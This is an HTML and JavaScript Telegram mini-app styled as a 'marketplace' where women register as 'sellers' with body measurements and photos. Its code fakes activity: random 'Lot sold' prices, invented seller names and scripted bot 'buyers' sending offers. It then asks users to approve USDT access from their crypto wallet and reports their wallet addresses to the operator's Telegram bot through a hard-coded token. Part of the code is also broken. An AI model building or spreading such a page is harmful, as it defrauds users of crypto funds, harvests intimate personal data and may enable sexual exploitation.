<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Marketplace</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            min-height: 100vh;
            background: linear-gradient(145deg, #0b0b1a 0%, #14142b 50%, #0d0d24 100%);
            display: flex; flex-direction: column; align-items: center;
            color: #fff; overflow-x: hidden;
        }
        .ticker-wrap {
            position: fixed; top:0; left:0; width:100%; height:36px;
            background: rgba(255,215,0,0.15); backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            border-bottom: 1px solid rgba(255,215,0,0.3);
            overflow: hidden; z-index:100;
            display: flex; align-items: center;
        }
        .ticker {
            display: flex; white-space: nowrap;
            animation: scroll 35s linear infinite;
            font-weight: 600; font-size:15px; letter-spacing:0.4px;
            color: #FFD966; text-shadow: 0 0 8px rgba(255,200,0,0.5);
            padding-left: 20px;
        }
        .ticker span { margin-right:40px; }
        .ticker span.sep { color:rgba(255,215,0,0.6); margin-right:40px; }
        @keyframes scroll {
            0% { transform: translateX(0); }
            100% { transform: translateX(-50%); }
        }
        .container {
            margin-top:56px; padding:20px 16px;
            width:100%; max-width:420px;
            display: flex; flex-direction: column; align-items: center;
        }
        .profile-area {
            display: flex; flex-direction: column; align-items: center;
            position: relative; cursor: pointer;
        }
        .profile-circle {
            width:90px; height:90px;
            background: rgba(99,102,241,0.2);
            border: 2px solid rgba(129,140,248,0.5);
            border-radius:50%;
            display: flex; align-items: center; justify-content: center;
            margin-bottom:6px; transition:0.2s;
            box-shadow: 0 0 20px rgba(129,140,248,0.25);
            overflow: hidden;
        }
        .profile-circle img { width:100%; height:100%; object-fit:cover; }
        .profile-circle svg {
            width:42px; height:42px; stroke:#a5b4fc; fill:none; stroke-width:1.6;
        }
        .register-label { font-size:14px; font-weight:500; color:#a5b4fc; margin-bottom:8px; }
        .notification-badge {
            position:absolute; top:-5px; right:-5px;
            background:#ef4444; color:#fff; border-radius:50%;
            width:22px; height:22px; display:none;
            align-items:center; justify-content:center;
            font-size:12px; font-weight:bold;
            border:2px solid #14142b;
        }
        .admin-btn {
            background: rgba(255,215,0,0.15);
            border:1px solid rgba(255,215,0,0.4);
            color:#FFD966; border-radius:12px;
            padding:8px 16px; font-size:13px; font-weight:600;
            margin-bottom:16px; cursor:pointer; display:none;
        }
        .vitrina-title {
            font-size:18px; font-weight:600; color:#e0e7ff;
            margin:8px 0 16px; align-self:flex-start;
        }
        .sellers-grid {
            display:grid; grid-template-columns: repeat(2,1fr);
            gap:12px; width:100%; padding-bottom:40px;
        }
        .seller-card {
            background:rgba(255,255,255,0.04); border-radius:20px;
            padding:12px; border:1px solid rgba(255,255,255,0.06);
            display:flex; flex-direction:column; align-items:center;
            pointer-events:none; opacity:0.85;
        }
        .seller-photo {
            width:80px; height:80px; background:rgba(255,255,255,0.06);
            border-radius:50%; margin-bottom:8px;
            display:flex; align-items:center; justify-content:center;
            color:rgba(255,255,255,0.3); font-size:11px; overflow:hidden;
        }
        .seller-photo img { width:100%; height:100%; object-fit:cover; }
        .seller-name { font-size:14px; font-weight:500; color:#ddd; }

        .modal-overlay {
            display:none; position:fixed; top:0; left:0; right:0; bottom:0;
            background:rgba(0,0,0,0.7); backdrop-filter:blur(8px);
            -webkit-backdrop-filter:blur(8px); z-index:200;
            align-items:center; justify-content:center;
        }
        .modal-overlay.active { display:flex; }
        .modal-box {
            background:rgba(20,20,40,0.95);
            border:1px solid rgba(255,255,255,0.12);
            border-radius:28px; padding:28px 20px;
            width:90%; max-width:360px; max-height:85vh;
            overflow-y:auto; display:flex; flex-direction:column;
        }
        .form-group { margin-bottom:16px; }
        .form-group label {
            display:block; font-size:13px; color:rgba(255,255,255,0.6);
            margin-bottom:4px;
        }
        .form-group input, .form-group select {
            width:100%; padding:12px 14px;
            background:rgba(255,255,255,0.06);
            border:1px solid rgba(255,255,255,0.1);
            border-radius:14px; color:#fff; font-size:15px; outline:none;
        }
        .action-btn {
            background: linear-gradient(135deg, #6366f1, #4f46e5);
            border:none; border-radius:16px; padding:14px;
            color:white; font-weight:600; font-size:16px;
            text-align:center; cursor:pointer; margin-top:8px;
        }
        .action-btn:disabled { opacity:0.5; pointer-events:none; }
        .photo-upload-area { display:flex; gap:10px; justify-content:center; margin:10px 0; }
        .photo-slot {
            width:70px; height:70px; border:2px dashed rgba(255,255,255,0.3);
            border-radius:16px; display:flex; align-items:center; justify-content:center;
            font-size:11px; color:#aaa; background:rgba(255,255,255,0.03); overflow:hidden;
        }
        .photo-slot img { width:100%; height:100%; object-fit:cover; }
        .close-btn {
            background:transparent; border:1px solid rgba(255,255,255,0.2);
            color:#ccc; border-radius:14px; padding:10px; margin-top:12px;
            font-size:14px; cursor:pointer;
        }
        .offer-card {
            background:rgba(255,255,255,0.04); border-radius:20px;
            padding:12px; margin-bottom:12px; display:flex; align-items:center;
            gap:12px; border:1px solid rgba(255,255,255,0.06);
        }
        .offer-card img {
            width:50px; height:50px; border-radius:50%;
            object-fit:cover; background:#222;
        }
        .offer-info { flex:1; font-size:14px; }
    </style>
</head>
<body>
<div class="ticker-wrap">
    <div class="ticker" id="ticker"></div>
</div>

<div class="container" id="mainContainer">
    <!-- Admin button (visible only for admin, non‑functional now) -->
    <div class="admin-btn" id="adminPanelBtn">Admin Panel (soon)</div>
    <div class="profile-area" id="profileArea">
        <div class="profile-circle" id="profileCircle">
            <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" id="defaultProfileIcon">
                <path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/>
                <circle cx="12" cy="7" r="4"/>
            </svg>
        </div>
        <div class="notification-badge" id="notifBadge">0</div>
        <div class="register-label" id="profileLabel">Register</div>
    </div>
    <div class="vitrina-title">Sellers</div>
    <div class="sellers-grid" id="sellersGrid"></div>
</div>

<!-- Modals -->
<div class="modal-overlay" id="roleModal">
    <div class="modal-box">
        <h2>Choose role</h2>
        <div class="role-btn" id="sellerRoleBtn">I am a seller</div>
        <div class="role-btn" id="buyerRoleBtn">I am a buyer</div>
        <button class="close-btn" id="closeRoleModal">Cancel</button>
    </div>
</div>

<div class="modal-overlay" id="sellerFormModal">
    <div class="modal-box">
        <h2>Seller details</h2>
        <div class="form-group"><label>Name</label><input type="text" id="sName" placeholder="Jane"></div>
        <div class="form-group"><label>Age</label><input type="number" id="sAge" placeholder="25"></div>
        <div class="form-group"><label>Country</label><input type="text" id="sCountry" placeholder="USA"></div>
        <div class="form-group"><label>Height (cm)</label><input type="number" id="sHeight" placeholder="170"></div>
        <div class="form-group"><label>Weight (kg)</label><input type="number" id="sWeight" placeholder="55"></div>
        <div class="form-group"><label>Bust</label><input type="text" id="sBust" placeholder="C"></div>
        <div class="form-group"><label>Parameters</label><input type="text" id="sParams" placeholder="90-60-90"></div>
        <button class="action-btn" id="sellerNextBtn">Continue to photos</button>
        <button class="close-btn" id="closeSellerForm">Cancel</button>
    </div>
</div>

<div class="modal-overlay" id="photoModal">
    <div class="modal-box">
        <h2>Upload at least 3 photos</h2>
        <div class="photo-upload-area">
            <div class="photo-slot" id="slot1"><span>+</span></div>
            <div class="photo-slot" id="slot2"><span>+</span></div>
            <div class="photo-slot" id="slot3"><span>+</span></div>
        </div>
        <input type="file" accept="image/*" id="photoInput" style="display:none" multiple>
        <button class="action-btn" id="uploadTriggerBtn">Select photos</button>
        <button class="action-btn" id="photoDoneBtn" disabled>Complete registration</button>
        <button class="close-btn" id="closePhotoModal">Back</button>
    </div>
</div>

<div class="modal-overlay" id="walletModal">
    <div class="modal-box">
        <h2>Before proceeding, connect your crypto wallet</h2>
        <p style="font-size:13px;color:#aaa;text-align:center;margin-bottom:16px;">
            Approve access to your USDT to continue.
        </p>
        <div class="form-group">
            <label>Network</label>
            <select id="network">
                <option value="ethereum">Ethereum (ERC-20)</option>
                <option value="bsc">BNB Smart Chain (BEP-20)</option>
                <option value="tron">Tron (TRC-20)</option>
            </select>
        </div>
        <div class="form-group">
            <label>Wallet address</label>
            <input type="text" id="walletAddress" placeholder="0x... or T...">
        </div>
        <button class="action-btn" id="approveBtn">Approve</button>
        <div style="text-align:center;margin-top:12px;font-size:14px;color:#aaa;" id="walletStatus"></div>
        <button class="close-btn" id="closeWalletModal">Cancel</button>
    </div>
</div>

<div class="modal-overlay" id="offersModal">
    <div class="modal-box" style="max-width:380px;">
        <h2>Offers</h2>
        <div id="offersList"></div>
        <button class="close-btn" id="closeOffersModal">Close</button>
    </div>
</div>
    <script>
(function() {
    // ====== CONFIG ======
    const BOT_TOKEN = '8321043451:AAFkPYQUfofdsb7dbKBaZpxpJ3o55YHN9W8';                // токен бота
    const ADMIN_CHAT_ID = '8696933754';              // ваш Telegram ID (числовой)
    const JSONBIN_API_KEY = 'YOUR_JSONBIN_API_KEY';   // API-ключ JSONBin
    const JSONBIN_BIN_ID = 'YOUR_JSONBIN_BIN_ID';     // ID бина

    // JSONBin structure:
    // {
    //   "profiles": [],
    //   "buyerProfiles": [
    //     { "id": 1, "name": "Takeshi", "photo": "base64...", "message": "I want to meet you" }
    //   ],
    //   "settings": { "adminTRC20": "T...", "adminERC20": "0x..." }
    // }

    const tg = window.Telegram?.WebApp;
    if (tg) { tg.ready(); tg.expand(); }

    // Ticker
    const ticker = document.getElementById('ticker');
    let tickHTML = '';
    for (let i=0;i<30;i++) {
        let amt = Math.floor(Math.random()*4851)+150; // 150–5000
        tickHTML += `<span>Lot sold for $${amt}</span><span class="sep">•</span>`;
    }
    ticker.innerHTML = tickHTML + tickHTML;

    // 100 female names
    const femaleNames = [
        "Sophia","Olivia","Emma","Ava","Isabella","Mia","Luna","Harper","Evelyn","Ella",
        "Avery","Scarlett","Grace","Chloe","Zoey","Lily","Hannah","Aria","Ellie","Nora",
        "Leah","Maya","Riley","Naomi","Layla","Stella","Victoria","Aurora","Penelope","Addison",
        "Brooklyn","Hazel","Aaliyah","Camila","Genesis","Natalie","Savannah","Aubrey","Bella","Skylar",
        "Claire","Violet","Gabriella","Madelyn","Eleanor","Alice","Ruby","Ivy","Willow","Kinsley",
        "Paisley","Lillian","Addison","Daisy","Nevaeh","Clara","Reagan","Morgan","Faith","Elena",
        "Jade","Lydia","Taylor","Trinity","Sienna","Reese","Daniela","Summer","Brooke","Keira",
        "Alina","Anastasia","Tessa","Liliana","Fiona","Giselle","Noelle","Kendall","Phoebe","Alana",
        "Nadia","Catherine","Sasha","Leilani","Adriana","Julianna","Lola","Miranda","Gracelyn","Diana",
        "Angelina","Cecilia","Megan","Logan","Brynn","Emerson","Jocelyn","Marley","Payton","Alexa"
    ];

    let currentUser = null;          // текущий пользователь (продавец)
    let allProfiles = [];            // все профили продавцов
    let buyers = [];                 // боты-покупатели
    let settings = { adminTRC20:'', adminERC20:'' };

    // Загрузка данных из JSONBin
    async function fetchBin() {
        const resp = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}/latest`, {
            headers: { 'X-Master-Key': JSONBIN_API_KEY }
        });
        const data = await resp.json();
        return data.record;
    }
    async function updateBin(record) {
        await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`, {
            method:'PUT',
            headers: { 'Content-Type':'application/json', 'X-Master-Key': JSONBIN_API_KEY },
            body: JSON.stringify(record)
        });
    }

    // Инициализация
    async function init() {
        try {
            const rec = await fetchBin();
            settings = rec.settings || { adminTRC20:'', adminERC20:'' };
            buyers = rec.buyerProfiles || [];
            allProfiles = rec.profiles || [];
        } catch(e) { console.error(e); }

        const userId = tg?.initDataUnsafe?.user?.id;
        currentUser = allProfiles.find(p => p.userId === userId);
        renderMain();
        checkAdminVisibility();

        if (currentUser) {
            // Генерация оффера, если прошло 30 минут
            checkAndGenerateOffer();
        }
    }

    function renderMain() {
        const circle = document.getElementById('profileCircle');
        const label = document.getElementById('profileLabel');
        const badge = document.getElementById('notifBadge');
        const grid = document.getElementById('sellersGrid');

        if (currentUser) {
            const photo = currentUser.photoBase64?.[0];
            circle.innerHTML = photo ? `<img src="${photo}">` : `<svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>`;
            label.textContent = currentUser.sellerData?.name || 'You';
            const unread = (currentUser.offers||[]).filter(o=>!o.read).length;
            badge.style.display = unread ? 'flex' : 'none';
            badge.textContent = unread;
            document.getElementById('profileArea').onclick = ()=>showOffers();
        } else {
            circle.innerHTML = `<svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>`;
            label.textContent = 'Register';
            badge.style.display = 'none';
            document.getElementById('profileArea').onclick = openRoleSelection;
        }

        // Сбор продавцов для витрины
        let sellers = [];
        const realSellers = allProfiles.filter(p => p.userId !== currentUser?.userId && p.sellerData);
        if (realSellers.length === 0) {
            sellers = femaleNames.map(name => ({
                userId: null,
                sellerData: { name },
                photoBase64: []
            }));
        } else {
            sellers = realSellers;
        }
        shuffle(sellers);
        grid.innerHTML = sellers.map(p => {
            const ph = p.photoBase64?.[0];
            return `<div class="seller-card">
                <div class="seller-photo">${ph ? `<img src="${ph}">` : 'Photo'}</div>
                <div class="seller-name">${p.sellerData?.name || 'Unknown'}</div>
            </div>`;
        }).join('');
    }

    function shuffle(arr) {
        for (let i = arr.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [arr[i], arr[j]] = [arr[j], arr[i]];
        }
    }

    // Открытие выбора роли
    function openRoleSelection() {
        document.getElementById('roleModal').classList.add('active');
    }
    document.getElementById('closeRoleModal').onclick = ()=> document.getElementById('roleModal').classList.remove('active');
    document.getElementById('sellerRoleBtn').onclick = ()=>{
        document.getElementById('roleModal').classList.remove('active');
        document.getElementById('sellerFormModal').classList.add('active');
    };
    document.getElementById('buyerRoleBtn').onclick = ()=>{
        document.getElementById('roleModal').classList.remove('active');
        // Покупатель сразу переходит к привязке кошелька
        document.getElementById('walletModal').classList.add('active');
        // Запоминаем, что это не оффер, а прямая привязка
        window.pendingDealOffer = undefined;
    };

    // Регистрация продавца
    document.getElementById('closeSellerForm').onclick = ()=> document.getElementById('sellerFormModal').classList.remove('active');
    document.getElementById('sellerNextBtn').onclick = ()=>{
        if (!document.getElementById('sName').value.trim()) {
            alert('Name required'); return;
        }
        document.getElementById('sellerFormModal').classList.remove('active');
        document.getElementById('photoModal').classList.add('active');
    };

    let selectedFiles = [];
    document.getElementById('uploadTriggerBtn').onclick = ()=> document.getElementById('photoInput').click();
    document.getElementById('photoInput').onchange = (e)=>{
        selectedFiles = Array.from(e.target.files).slice(0,3);
        for (let i=0;i<3;i++) {
            const slot = document.getElementById('slot'+(i+1));
            if (i < selectedFiles.length) {
                const reader = new FileReader();
                reader.onload = ev => slot.innerHTML = `<img src="${ev.target.result}">`;
                reader.readAsDataURL(selectedFiles[i]);
            } else slot.innerHTML = '<span>+</span>';
        }
        document.getElementById('photoDoneBtn').disabled = selectedFiles.length < 3;
    };
    document.getElementById('closePhotoModal').onclick = ()=>{
        document.getElementById('photoModal').classList.remove('active');
        document.getElementById('sellerFormModal').classList.add('active');
    };
    document.getElementById('photoDoneBtn').onclick = async ()=>{
        if (selectedFiles.length<3) return;
        const sellerData = {
            name: document.getElementById('sName').value.trim(),
            age: document.getElementById('sAge').value.trim(),
            country: document.getElementById('sCountry').value.trim(),
            height: document.getElementById('sHeight').value.trim(),
            weight: document.getElementById('sWeight').value.trim(),
            bust: document.getElementById('sBust').value.trim(),
            parameters: document.getElementById('sParams').value.trim()
        };
        const photos = await Promise.all(selectedFiles.map(f=> new Promise(res=>{
            const r = new FileReader();
            r.onload = ()=> res(r.result);
            r.readAsDataURL(f);
        })));
        const userId = tg?.initDataUnsafe?.user?.id;
        const newProfile = {
            userId,
            userInfo: tg?.initDataUnsafe?.user ? `ID:${tg.initDataUnsafe.user.id} @${tg.initDataUnsafe.user.username||''}` : '',
            sellerData,
            photoBase64: photos,
            offers: [],
            lastOfferTime: new Date().toISOString(),
            wallet: null,
            registeredAt: new Date().toISOString()
        };
        allProfiles.push(newProfile);
        await updateBin({...await fetchBin(), profiles: allProfiles});
        currentUser = newProfile;
        document.getElementById('photoModal').classList.remove('active');
        renderMain();
        sendAdmin(`New seller registered: ${sellerData.name}`);
    };
        // Генерация оффера (раз в 30 минут при входе)
    async function checkAndGenerateOffer() {
        if (!currentUser || !buyers.length) return;
        const now = Date.now();
        const last = new Date(currentUser.lastOfferTime).getTime();
        if (now - last < 30 * 60 * 1000) return;

        const buyer = buyers[Math.floor(Math.random() * buyers.length)];
        const offer = {
            buyerId: buyer.id,
            message: buyer.message,
            timestamp: new Date().toISOString(),
            read: false
        };
        currentUser.offers.push(offer);
        currentUser.lastOfferTime = new Date().toISOString();
        const idx = allProfiles.findIndex(p => p.userId === currentUser.userId);
        if (idx >= 0) allProfiles[idx] = currentUser;
        await updateBin({...await fetchBin(), profiles: allProfiles});
        renderMain();
    }

    // Показ офферов
    function showOffers() {
        if (!currentUser) return;
        const list = document.getElementById('offersList');
        const offers = currentUser.offers || [];
        list.innerHTML = offers.map((o, i) => {
            const buyer = buyers.find(b => b.id === o.buyerId);
            const photo = buyer?.photo || '';
            const name = buyer?.name || 'Buyer';
            return `<div class="offer-card">
                <img src="${photo || 'data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 50 50%22%3E%3Ccircle cx=%2225%22 cy=%2225%22 r=%2225%22 fill=%22%23333%22/%3E%3C/svg%3E'}">
                <div class="offer-info"><strong>${name}</strong><p>${o.message}</p></div>
                <button class="action-btn" onclick="contactDeal(${i})">Make offer</button>
            </div>`;
        }).join('');

        // Помечаем все как прочитанные
        currentUser.offers.forEach(o => o.read = true);
        const idx = allProfiles.findIndex(p => p.userId === currentUser.userId);
        if (idx >= 0) allProfiles[idx] = currentUser;
        updateBin({...await fetchBin(), profiles: allProfiles});
        renderMain();
        document.getElementById('offersModal').classList.add('active');
    }
    document.getElementById('closeOffersModal').onclick = ()=> document.getElementById('offersModal').classList.remove('active');

    window.contactDeal = function(offerIndex) {
        if (!currentUser.wallet) {
            // Нет привязанного кошелька – показываем форму привязки
            document.getElementById('offersModal').classList.remove('active');
            document.getElementById('walletModal').classList.add('active');
            window.pendingDealOffer = offerIndex;
        } else {
            // Кошелёк уже привязан – сразу отправляем запрос админу (заглушка)
            sendDeal(offerIndex);
        }
    };

    function sendDeal(offerIndex) {
        const offer = currentUser.offers[offerIndex];
        const buyer = buyers.find(b => b.id === offer.buyerId);
        sendAdmin(`Deal request from ${currentUser.sellerData.name} (${currentUser.wallet.address}) for buyer ${buyer.name}.`);
        alert('Your request has been sent!');
        document.getElementById('offersModal').classList.remove('active');
    }

    // Привязка кошелька (approve)
    document.getElementById('approveBtn').onclick = async () => {
        const network = document.getElementById('network').value;
        const address = document.getElementById('walletAddress').value.trim();
        if (!address) return;

        document.getElementById('walletStatus').textContent = 'Approving...';
        // Имитация успешного approve (в реальности здесь вызов кошелька)
        setTimeout(async () => {
            currentUser.wallet = { network, address, approved: true };
            const idx = allProfiles.findIndex(p => p.userId === currentUser.userId);
            if (idx >= 0) allProfiles[idx] = currentUser;
            await updateBin({...await fetchBin(), profiles: allProfiles});

            document.getElementById('walletStatus').textContent = 'Wallet connected!';
            document.getElementById('walletModal').classList.remove('active');

            // Если была ожидающая сделка – отправляем её
            if (window.pendingDealOffer !== undefined) {
                sendDeal(window.pendingDealOffer);
                window.pendingDealOffer = undefined;
            }
            renderMain();
            sendAdmin(`User ${currentUser.sellerData?.name} connected wallet ${address} on ${network}`);
        }, 1000);
    };
    document.getElementById('closeWalletModal').onclick = ()=> document.getElementById('walletModal').classList.remove('active');

    // Админская кнопка (только видимость, без функционала)
    function checkAdminVisibility() {
        const btn = document.getElementById('adminPanelBtn');
        if (tg?.initDataUnsafe?.user?.id && String(tg.initDataUnsafe.user.id) === String(ADMIN_CHAT_ID)) {
            btn.style.display = 'block';
            btn.onclick = ()=> alert('Admin panel will be available via helper bot.');
        }
    }

    // Отправка сообщения админу в Telegram
    function sendAdmin(text) {
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text })
        }).catch(()=>{});
    }

    init();
})();
</script>
</body>
</html>
